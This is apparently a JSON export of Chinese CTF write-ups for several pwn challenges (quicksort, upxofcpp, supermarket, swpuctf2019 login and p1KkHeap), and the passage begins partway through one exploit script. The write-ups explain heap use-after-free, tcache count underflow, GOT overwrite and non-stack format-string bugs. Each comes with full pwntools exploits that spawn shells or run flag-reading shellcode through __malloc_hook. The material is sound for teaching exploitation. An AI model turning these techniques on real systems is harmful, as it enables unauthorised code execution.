remote(&#x27;node3.buuoj.cn&#x27;,26439)elf = ELF(&#x27;./starctf_2019_quicksort&#x27;)libc = ELF(&#x27;./libc-2.23_x86.so&#x27;)gets_got = elf.got[&#x27;gets&#x27;]atoi_got = elf.got[&#x27;atoi&#x27;]vuln_addr = 0x08048816sh.sendlineafter(&#x27;sort?&#x27;,&#x27;1&#x27;)#修改free的got表为main，同时泄露puts的地址payload = str(vuln_addr).ljust(0x10,&#x27;\\x00&#x27;) + p32(1)*2 + p32(0) + p32(gets_got)sh.sendlineafter(&#x27;number:&#x27;,payload)sh.recvuntil(&#x27;result:\\n&#x27;)gets_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) + 0x100000000libc_base = gets_addr - libc.sym[&#x27;gets&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)sh.sendlineafter(&#x27;sort?&#x27;,&#x27;1&#x27;)payload = str(system_addr - 0x100000000).ljust(0x10,&#x27;\\x00&#x27;) + p32(1)*2 + p32(0) + p32(atoi_got - 0x4)sh.sendlineafter(&#x27;number:&#x27;,payload)#getshellsh.sendlineafter(&#x27;sort?&#x27;,&#x27;1&#x27;)sh.sendlineafter(&#x27;number:&#x27;,&#x27;/bin/sh\\x00&#x27;)sh.interactive()","categories":["CTF"],"tags":["栈溢出","变量覆盖"]},{"title":"starctf_2019_upxofcpp","url":"/2020/04/30/starctf_2019_upxofcpp/","content":"程序用了UPX壳保护，通过upx –d脱壳后，拿到IDA里分析。\n\n\nDelete以后没有清空指针，存在UAF，但是无法double free，因为程序中使用虚表调用，delete一次后，虚表对应位置已经被清空。因此第二次delete同一个chunk将进入else语句，进而崩溃。由于函数指针放在chunk里，因此，我们可以伪虚表指针，再利用UAF来执行。由于使用的是upx加壳，脱壳后，显示NX保护是关闭的，但是宿主是upx的壳，upx壳程序通过mmap映射出RWX的内存放置受保护的程序，因此，在这里堆栈是可执行的，也可以通过gdb调试查看。因此，我们在堆里布置下shellcode。\n我们先申请两个堆释放\nadd(2,0x20&#x2F;4,[-1])\nadd(3,0x20&#x2F;4,[-1])\ndelete(2)\ndelete(3)\n接下来我们触发malloc_cosolidate\nadd(4,0x100,[-1])\n此时，2的fd伪造写上了main_arena 88的地址\n\n\n因此，main_arena_88被当成一个虚表\nMain_arena_88+0x10处指向2的头\n\n\nShow功能取得正是vtable+0x10处的函数指针来执行\n\n\n因此, Main_arena_88+0x10处的数据被当成一个函数指针，因此，我们只要利用堆的共用，在2的prev_size处布置一条jmp $xxxx的指令，然后通过show(2)就可以执行这个jmp，跳到主shellcode里。\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)sh = process(&#x27;./starctf_2019_upxofcpp&#x27;)#sh = process(&#x27;./upxofcpp&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,28611)def add(index,size,data):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   for x in data:      if (x &amp; 0x80000000 == 0x80000000) and x != -1:         x -= 0x100000000      sh.sendline(str(x))def delete(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))shellcode = asm(shellcraft.sh())data = []for x in range(0,len(shellcode),4):   data.append(u32(shellcode[x:x+4]))add(0,len(data),data)add(1,0x18/4,[0,1,2,3,u32(asm(&#x27;jmp $-0x70&#x27;).ljust(4,&#x27;\\x00&#x27;)),-1])add(2,0x20/4,[-1])add(3,0x20/4,[-1])delete(2)delete(3)add(4,0x100,[-1])#getshellshow(2)sh.interactive()","categories":["CTF"],"tags":["UAF","malloc_consolidate","UPX壳RWX"]},{"title":"Supermarket","url":"/2019/11/15/supermarket/","content":"首先，看一下程序的保护机制。看起来还不错\n\n\n然后，我们用IDA分析一下\n\n\n分析出程序大概有这样的一个结构体\ntypedef struct Node &#123;      char name[16];      int price;      int description_size;      char *description;  &#125; Node;  \n\n用来输入的函数\n\n\n最多只能输入n-1个字符，因此，也不能溢出\n\n\n删除功能，也对Node指针设置了NULL\n一切的检查的比较充分，然而，这里出现的漏洞\n\n\n让我们先看看realloc的知识\n根据百度百科\n**realloc原型是extern void realloc(void mem_address, unsigned int newsize);\n先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回，如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域（注意：原来指针是自动释放，不需要使用free），同时返回新分配的内存区域的首地址。即重新分配存储器块的地址。\n本程序中，realloc后，并没有把返回值重新赋值给node0-&gt;description，因此，当realloc的newsize大于原来的size时，原来区域的空间会被free掉，由于没有把返回地址赋给node0-&gt;description，因此存在UAF漏洞。\n并且，由于创建node时，是先malloc node结构体，然后再malloc description的空间，所以，当我们再次申请创建一个node时，如果满足条件，node结构体就会申请到node0-&gt;description，然后，我们编辑node0的description就是编辑node1的结构体，我们把node1的description指向atoi的got表，我们就可以实现泄露atoi的地址以及修改atoi的GOT表。\n注意，我们的node0的description的大小必须为unsorted bin，因为，这样我们才能让node2的结构体申请到node0-&gt;description处，因为结构体空间大小为0x1C，刚好满足小于node0-&gt;description地址处空间的大小，可以从中切割区域。如果要使用fastbin的话，是不可行的，因为fastbin是当要申请的空间大小和空闲的空间大小一模一样时，才能分配到那个空闲的块处，假如我们设置的大小为0x1C，但是本题的用来获取输入的函数最多只能输入n-1个字符，最后一个字符会强制设置为0，**而我们要把atoi的got表地址覆盖到node2-&gt;description，由于该字段位于结构体最后，因此，我们将会覆盖不完整。**所以，我们使用unsorted bin。（请仔细思考一下）\n当我们成功修改了node2的结构体时，我们就成功了八成了。只要我们把node2-&gt; description指向atoi的got表，那么我们编辑node2的description时就是在编辑atoi的got表\n综上，我们最终的exp脚本如下\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./supermarket&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,55879)  elf = ELF(&#x27;./supermarket&#x27;)  atoi_got = elf.got[&#x27;atoi&#x27;]    def create(index,size,content):     sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;name:&#x27;,str(index))     sh.sendlineafter(&#x27;price:&#x27;,&#x27;10&#x27;)     sh.sendlineafter(&#x27;descrip_size:&#x27;,str(size))     sh.sendlineafter(&#x27;description:&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;name:&#x27;,str(index))    def show():     sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;3&#x27;)    def edit(index,size,content):     sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;5&#x27;)     sh.sendlineafter(&#x27;name:&#x27;,str(index))     sh.sendlineafter(&#x27;descrip_size:&#x27;,str(size))     sh.sendlineafter(&#x27;description:&#x27;,content)    #node0  create(0,0x80,&#x27;a&#x27;*0x10)  #node1，只用来做分隔作用，防止块合并  create(1,0x20,&#x27;b&#x27;*0x10)  #realloc node0-&gt;description  #注意不要加任何数据，因为我们发送的数据写入到的是一个被free的块（仔细思考一下这句话），这会导致后面malloc时出错  edit(0,0x90,&#x27;&#x27;)  #现在node2将被分配到node0的原description处  create(2,0x20,&#x27;d&#x27;*0x10)  payload = &#x27;2&#x27;.ljust(16,&#x27;\\x00&#x27;) + p32(20) + p32(0x20) + p32(atoi_got)  #由于没有把realloc返回的指针赋值给node0-&gt;description，因此node0-&gt;description还是原来那个地址处，现在存的是node1  #因此edit(0)就是编辑node1的结构体，我们通过修改，把node1-&gt;description指向atoi的got表  edit(0,0x80,payload)  #泄露信息  show()  sh.recvuntil(&#x27;2: price.20, des.&#x27;)  #泄露atoi的加载地址  atoi_addr = u32(sh.recvuntil(&#x27;\\n&#x27;).split(&#x27;\\n&#x27;)[0].ljust(4,&#x27;\\x00&#x27;))    libc = LibcSearcher(&#x27;atoi&#x27;,atoi_addr)  libc_base = atoi_addr - libc.dump(&#x27;atoi&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  #修改atoi的表，将它指向system  edit(2,0x20,p32(system_addr))  #getshell  sh.sendlineafter(&#x27;your choice&gt;&gt;&#x27;,&#x27;/bin/sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["unsorted bin","UAF","realloc"]},{"title":"swpuctf2019_login(非栈上的格式化字符串利用)","url":"/2019/12/09/swpuctf2019_login/","content":"这是swpuctf2019的第二道pwn题，主要考点就是**[非栈上的字符串格式化漏洞利用]{.mark}**。\n首先，我们检查一下程序的保护机制\n\n\nPIE和RELRO没有开启，那么我们可以轻易的利用漏洞修改GOT表\n我们用IDA分析一下\n\n\n在这里，有一个明显的格式化字符串漏洞，由于s1不是在栈上，而是在bss段里，所以漏洞利用起来会比栈上的字符串格式化漏洞稍微繁琐一些。由于外层是一个死循环，所以，我们不能用ROP来解，我们可以把printf的GOT表内容修改为system的地址，然后，我们输入&#x2F;bin&#x2F;sh字符串，就可以getshell。\n并且要注意，[我们必须一次性的完成printf的got表修改操作，不能分步]{.mark}，因为分步的话第一次修改了部分数据,printf的GOT表已经不再指向printf函数，所以第二次就利用不了了。\n\n\n可以泄露一些栈上的数据，来计算libc的地址\n#泄露__libc_start_main的地址  sh.sendlineafter(&#x27;Please input your password:&#x27;,&#x27;%15$p&#x27;)    sh.recvuntil(&#x27;0x&#x27;)  __libc_start_main_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16) - 0xF1  print hex(__libc_start_main_addr)  libc = LibcSearcher(&#x27;__libc_start_main&#x27;,__libc_start_main_addr)  libc_base = __libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  \n\n现在，有了一些需要的地址了，我们考虑怎么来写printf的GOT表，常规的栈格式化字符串漏洞，我们只需将地址放入字符串即可，因为字符串存在了栈里，但是非栈上的字符串，我们就不能这样操作了，我们需要借助格式化漏洞，先修改栈里的数据，改成需要的地址。\n\n\n我们**[用%6$hhn来修改%10$处的数据，然后利用%10$hhn来修改%14$处的数据，使得%14$处为printf的GOT表地址，同样的方法，让%15$处为printf_got + 1的值]{.mark}**，这样，我们在printf里用%14$hhn和%15$hn一次性完成对printf的got表数据后3字节完成了修改。第一个字节不用修改，因为都是一样的值。\n为了完成这个操作，我们就还需要泄露栈的地址\nsh.sendlineafter(&#x27;Try again!\\n&#x27;,&#x27;%6$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  stack_addr0 = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16)  print hex(stack_addr0)  sh.sendlineafter(&#x27;Try again!\\n&#x27;,&#x27;%10$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  stack_addr1 = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16)  print hex(stack_addr1)  \n\n接下来，我们要在14处写入printf的got表地址0x804B014\n#写栈14$处的低1字节为0x14  payload = &#x27;%&#x27; + str(0x14) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #变更10处的地址，+1  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 1) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低2字节为0xB0  payload = &#x27;%&#x27; + str(0xB0) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+2  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 2) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低3字节为0x04  payload = &#x27;%&#x27; + str(0x04) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+3  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 3) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低4字节为0x08  payload = &#x27;%&#x27; + str(0x08) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  \n\n接下来，我们要往15处写入printf_got+1的值，那么需要将%10$指向%15$处，也就是14的地址+4\n############在$15处存入printf_got+1################  #偏移4，指向$15  stack_addr1 = stack_addr1 + 4  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF)) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  \n\n接下来，就是一样的操作了，在15处写数据0x804B015\n#写栈15$处的低1字节为0x15  payload = &#x27;%&#x27; + str(0x15) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #变更10处的地址，+1  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 1) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低2字节为0xB0  payload = &#x27;%&#x27; + str(0xB0) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+2  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 2) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低3字节为0x04  payload = &#x27;%&#x27; + str(0x04) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+3  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 3) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低4字节为0x08  payload = &#x27;%&#x27; + str(0x08) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  \n\n现在，栈里%14$和%15$就布下了我们需要的目标地址了，为了防止出错，我们把%10$处的数据复原\n#复原10处的数据  payload = &#x27;%&#x27; + str( ((stack_addr1-4) &amp; 0xFF)) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  \n\n然后，我们就要一次性的改写printf的GOT表\n#现在%14$处存着的就是printf的GOT表地址  #我们开始来改写GOT表    #需要一次性将printf的got修改为system  #写低1字节  payload = &#x27;%&#x27; + str(system_addr &amp; 0xFF) + &#x27;c%14$hhn&#x27;  #写低2、3字节  payload += &#x27;%&#x27; + str(((system_addr &amp; 0xFFFF00)&gt;&gt;8)-0x10) + &#x27;c%15$hn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  \n\n接下来，我们就可以getshell了\n#getshell  time.sleep(0.5)  sh.sendline(&#x27;/bin/sh&#x27;)  \n\n综上，我们对非栈上的格式化字符串漏洞总结:\n[借助几个栈里的ebp，改写栈里的数据为目标地址，然后就可以像常规格式化字符串漏洞一样操作了。]{.mark}\n贴上完整的exp代码\n#coding:utf8  from pwn import *  from LibcSearcher import *  import time    #sh = process(&#x27;./login&#x27;)  sh = remote(&#x27;108.160.139.79&#x27;,9090)  elf = ELF(&#x27;./login&#x27;)  printf_got = 0x804B014    sh.sendafter(&#x27;Please input your name: \\n&#x27;,&#x27;zhaohai&#x27;)    #泄露__libc_start_main的地址  sh.sendlineafter(&#x27;Please input your password:&#x27;,&#x27;%15$p&#x27;)    sh.recvuntil(&#x27;0x&#x27;)  __libc_start_main_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16) - 0xF1  print hex(__libc_start_main_addr)  libc = LibcSearcher(&#x27;__libc_start_main&#x27;,__libc_start_main_addr)  libc_base = __libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)      sh.sendlineafter(&#x27;Try again!\\n&#x27;,&#x27;%6$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  stack_addr0 = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16)  print hex(stack_addr0)  sh.sendlineafter(&#x27;Try again!\\n&#x27;,&#x27;%10$p&#x27;)  sh.recvuntil(&#x27;0x&#x27;)  stack_addr1 = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True),16)  print hex(stack_addr1)    #写栈14$处的低1字节为0x14  payload = &#x27;%&#x27; + str(0x14) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #变更10处的地址，+1  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 1) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低2字节为0xB0  payload = &#x27;%&#x27; + str(0xB0) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+2  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 2) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低3字节为0x04  payload = &#x27;%&#x27; + str(0x04) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+3  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 3) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低4字节为0x08  payload = &#x27;%&#x27; + str(0x08) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)      ############在$15处存入printf_got+1################  #偏移4，指向$15  stack_addr1 = stack_addr1 + 4  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF)) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈15$处的低1字节为0x15  payload = &#x27;%&#x27; + str(0x15) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #变更10处的地址，+1  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 1) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低2字节为0xB0  payload = &#x27;%&#x27; + str(0xB0) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+2  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 2) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低3字节为0x04  payload = &#x27;%&#x27; + str(0x04) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #变更10处的地址，+3  payload = &#x27;%&#x27; + str( (stack_addr1 &amp; 0xFF) + 3) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #写栈14$处的低4字节为0x08  payload = &#x27;%&#x27; + str(0x08) + &#x27;c%10$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)    #复原10处的数据  payload = &#x27;%&#x27; + str( ((stack_addr1-4) &amp; 0xFF)) + &#x27;c%6$hhn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)      #现在%14$处存着的就是printf的GOT表地址  #我们开始来改写GOT表    #需要一次性将printf的got修改为system  #写低1字节  payload = &#x27;%&#x27; + str(system_addr &amp; 0xFF) + &#x27;c%14$hhn&#x27;  #写低2、3字节  payload += &#x27;%&#x27; + str(((system_addr &amp; 0xFFFF00)&gt;&gt;8)-0x10) + &#x27;c%15$hn&#x27;  sh.sendlineafter(&#x27;Try again!\\n&#x27;,payload)  #getshell  time.sleep(0.5)  sh.sendline(&#x27;/bin/sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["格式化字符串漏洞"]},{"title":"swpuctf2019_p1KkHeap","url":"/2019/12/08/swpuctf2019_p1KkHeap/","content":"这是swpuctf2019的一题，让我们来详细分析一下\n首先，我们检查一下程序的保护机制，发现保护全开\n\n\n然后，我们用IDA分析一下\n最大允许创建0x100的堆，并且最多有8个堆\n\n\n漏洞点在这里，free后，只把大小置为0，而没有把堆指针置为0，存在UAF漏洞\n\n\n本题，delete功能还有一个限制\n\n\n\n\n\n\ndelete功能只能用3次，超过会结束程序\n然后是edit功能，根据数组里保存的大小读取字符，我们free后，那个大小设置为了0，因此就不能用原来的下标去edit释放的堆，而应该create后分配到原来的堆，再edit\n\n\nshow功能，可以泄露信息\n\n\n程序还有一个限制\n\n\n\n\n程序最多只能调用18次功能，超过后程序结束。\n然后，我们看看给我们的libc版本为2.27\n\n\n程序还使用了沙箱机制，可能禁用了某些系统调用\n\n\n我们检测一下\n\n\nexecve被禁用，意味着我们不能调用system或onegadget来getshell\n我们先做一个总结:\n\nDelete只能用3次\n\n程序最多只能调用18次功能\n\n程序中存在堆指针UAF，可造成double free\n\nLibc版本为2.27，存在tcache机制，且2.27版本的tcache不检查double free(更高版本有检查)\n\nShow功能可以用来泄露地址信息\n\nedit功能可以用来修改\n\nexecve被禁用，我们应该构造shellcode或者ROP来[直接读取flag]{.mark}\n\n\n首先想想，我们该如何触发shellcode或ROP，在这，[我们可以攻击__malloc_hook，将shellcode的地址写入到__malloc_hook]{.mark}，在这里，ROP显然很麻烦，因为ROP还要做栈转移，并且需要先前依靠一段shellcode来转移栈，[如果供我们存放shellcode的地方空间很小，那么我们可以考虑写一段简短的shellcode，将栈转移]{.mark}，但是，[如果我们有足够的空间来放shellcode，那么，直接把读取和输出flag的shellcode写到那个空间。]{.mark}\n对于可写shellcode的空间很小，我还想到了另外一种方法，那就是写一段简短的shellcode，来调用int mprotect(const void *start, size_t len, int prot)函数，将某地址处属性修改为可执行，比如，我们可以把某个堆修改为可执行，那么就能在堆里布下shellcode。\n好吧，说了这么多，其实这题，我们是有足够的空间来写shellcode的，所以就不用那么麻烦。\n\n\n[程序在0x66660000这个固定的地址处映射了0x1000大小的空间，并且属性为RWX，既可读写，也具有执行属性，并且地址固定为0x66660000，使得我们更加方便。]{.mark}\n所以，我们决定把shellcode写到0x66660000处，然后攻击malloc_hook,在malloc_hook处写入0x66660000，这样，当我们再次malloc时，就会执行shellcode。\n那么，现在开始攻击吧\n首先，需要泄露一些地址，那么需要用到unsorted bin，但是，由于tcache的存在，对应的tcache bin满7个，接下来的堆块才会放入unsorted bin。满7个，就必须delete 7次，本题最多只能用3次，显然这个方案不可行。让我们来看看tcache 相关的源代码\nstruct malloc_par  &#123;    /* Tunable parameters */    unsigned long trim_threshold;    INTERNAL_SIZE_T top_pad;    INTERNAL_SIZE_T mmap_threshold;    INTERNAL_SIZE_T arena_test;    INTERNAL_SIZE_T arena_max;      /* Memory map support */    int n_mmaps;    int n_mmaps_max;    int max_n_mmaps;    /* the mmap_threshold is dynamic, until the user sets      it manually, at which point we need to disable any      dynamic behavior. */    int no_dyn_threshold;      /* Statistics */    INTERNAL_SIZE_T mmapped_mem;    INTERNAL_SIZE_T max_mmapped_mem;      /* First address handed out by MORECORE/sbrk.  */    char *sbrk_base;    #if USE_TCACHE    /* Maximum number of buckets to use.  */    size_t tcache_bins;    size_t tcache_max_bytes;    /* Maximum number of chunks in each bucket.  */    size_t tcache_count;    /* Maximum number of chunks to remove from the unsorted list, which      aren&#x27;t used to prefill the cache.  */    size_t tcache_unsorted_limit;  #endif  &#125;;    static struct malloc_par mp_ =  &#123;    .top_pad = DEFAULT_TOP_PAD,    .n_mmaps_max = DEFAULT_MMAP_MAX,    .mmap_threshold = DEFAULT_MMAP_THRESHOLD,    .trim_threshold = DEFAULT_TRIM_THRESHOLD,  #define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))    .arena_test = NARENAS_FROM_NCORES (1)  #if USE_TCACHE    ,    .tcache_count = TCACHE_FILL_COUNT,    .tcache_bins = TCACHE_MAX_BINS,    .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),    .tcache_unsorted_limit = 0 /* No limit.  */  #endif  &#125;;  \n\n注意，**[size_t tcache_bins;]{.mark}**是无符号的\n然后，看这里\n#if USE_TCACHE    &#123;      size_t tc_idx = csize2tidx (size);        if (tcache      &amp;&amp; tc_idx &lt; mp_.tcache_bins      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)        &#123;      tcache_put (p, tc_idx);      return;        &#125;    &#125;  #endif  \n\n其中counts是有符号数组\n看似，好像不会出什么问题，我们来看看这样的C语言代码\n#include &lt;stdio.h&gt;    int main() &#123;      size_t a = 7;      int b = -1;      printf(&quot;b&lt;a? %d&quot;,b&lt;a);      return 0;  &#125;  \n\n程序的执行结果\n\n\n由此，[我们知道了，当一个有符号数和一个无符号数进行比较时，有符号数会先转换成无符号数，然后再进行比较。]{.mark}\n[重点在这]{.mark}\n那么，假设，我们double free同一个堆，那么在tcache bin里就会构成循环链表，此时count&#x3D;2，然后，我们再create 3个一样大小的堆，那么count就变成了-1,此时，我们再delete一个unsorted bin范围的堆，这个堆就会放入unsorted bin，然后我们用show功能就能泄露出libc中的指针。\n\n\n形成双向链表，那么我们create后，写入一个新地址，那么新地址就会链接到tcache bin链表的后面，我们看看\n\n\n那么，我们再malloc 2次，就可以分配到aaaaaaaa处，但是注意，[这种方法，我们只能攻击一次]{.mark}，也就是说，我们攻击了malloc_hook后，就攻击不了0x66660000，攻击了0x66660000就攻击不了malloc_hook了，二者不可兼得。因为不再是循环链表，并且delete只能用3次，不能再构建循环链表了。\n解决方法是，我们**[用一次攻击，直接去攻击tcache bin的表头]{.mark}**，那么，下次，我们就能直接修改表头，来决定下一次堆分配到哪个地方。\n[tcache bin的表头是在堆中的，一般在第一个堆的前面某次，我们用]{.mark}IDA[找到]{.mark}\n\n\n我们找到了表头指针的位置，它距离第一个堆的位置是- 0x188个字节。\n因此，我们要攻击这里，修改表头指针，这样就能决定下一次分配的位置了。\n那么，我们需要先泄露第一个堆的地址\n#chunk0  create(0x100)  #chunk1，用来挡住chunk0与top块，这样chunk0放入unsorted bin时不会发生合并，指针就会保留在chunk0中  create(0x40)    #chunk0和自己形成双向链表  delete(0)  delete(0)  #泄露chunk0的堆地址  show(0)  sh.recvuntil(&#x27;content: &#x27;)  heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x10    #得到tcache存放表头的地址  tcache_head_addr = heap_addr - 0x188  \n\n得到了表头地址，那么我们就要开始攻击表头了\n#chunk2  create(0x100)  #将chunk0的fd指向表头指针处  edit(2,p64(tcache_head_addr))  #chunk3  create(0x100)  #chunk4，chunk4是tcache存放表头指针的位置，我们edit chunk4，就能修改tcache的表头  #现在tcache 的count变成了-1，由于是无符号数，导致比较时&gt;7成立  create(0x100)  \n\n现在chunk4就是表头指针处的空间，我们edit chunk4，就能修改表头指针\n#chunk0进入unsorted bin  delete(0)  #泄露main_arena+96的地址  show(0)  sh.recvuntil(&#x27;content: &#x27;)    main_arena_96 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_96 &amp; 0xFFFFFFFFFFFFFF00) + (malloc_hook_s &amp; 0xFF)  libc_base = malloc_hook_addr - malloc_hook_s  open_addr = libc_base + open_s  read_addr = libc_base + read_s  write_addr = libc_base + write_s  \n\n我们先来攻击0x66660000,写入shellcode\n#将表头指向0x66660000，这样我们就能分配到这里了  edit(4,p64(0x66660000))    #&#x27;flag.txt&#x27;  shellcode = asm(&#x27;mov rax,0x7478742E67616C66&#x27;)  shellcode += asm(&#x27;push 0x0&#x27;)  shellcode += asm(&#x27;push rax&#x27;)  #rsi = 0  shellcode += asm(&#x27;mov rsi,0&#x27;)  shellcode += asm(&#x27;mov rdi,rsp&#x27;)  #call open  shellcode += asm(&#x27;mov rax,&#x27; + hex(open_addr))  shellcode += asm(&#x27;call rax&#x27;)  #fd  shellcode += asm(&#x27;mov rdi,rax&#x27;)  #buf  shellcode += asm(&#x27;mov rsi,rsp&#x27;)  #len  shellcode += asm(&#x27;mov rdx,0x30&#x27;)  #call read  shellcode += asm(&#x27;mov rax,&#x27; + hex(read_addr))  shellcode += asm(&#x27;call rax&#x27;)  #fd  shellcode += asm(&#x27;mov rdi,1&#x27;)  ##buf  shellcode += asm(&#x27;mov rsi,rsp&#x27;)  #len  shellcode += asm(&#x27;mov rdx,0x30&#x27;)  #call write  shellcode += asm(&#x27;mov rax,&#x27; + hex(write_addr))  shellcode += asm(&#x27;call rax&#x27;)    #chunk5分配到了0x66660000  create(0x100)  #写入shellcode到0x66660000  edit(5,shellcode)  \n\n接下来，我们攻击malloc_hook,然后触发malloc_hook\n#将malloc_hook设置为tcache bin表头  edit(4,p64(malloc_hook_addr))  #chunk6分配到malloc_hook处  create(0x100)    #写malloc_hook  edit(6,p64(0x66660000))    #触发malloc hook去执行我们在0x66660000处布下的shellcode  create(0x1)  